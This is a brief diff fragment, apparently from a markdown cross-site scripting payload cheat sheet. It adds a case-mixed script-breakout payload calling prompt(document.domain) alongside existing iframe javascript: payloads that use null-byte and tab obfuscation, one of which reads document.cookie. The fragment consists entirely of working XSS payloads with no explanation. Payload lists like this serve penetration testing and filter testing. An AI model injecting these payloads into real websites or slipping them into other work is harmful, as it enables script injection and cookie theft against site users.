@@ -83,6 +83,7 @@ tes/><iframe src-javascript:prompt(document.cookie)>
 ?msg=<iframe %00 src=”&Tab;javascript:prompt(1)&Tab;”%00>
 ?msg=<h1>Hello World</h1>
 
+'+</ScripT><ScRIpT>prompt(document.domain)</scRIpT>+'
 
 ```
 
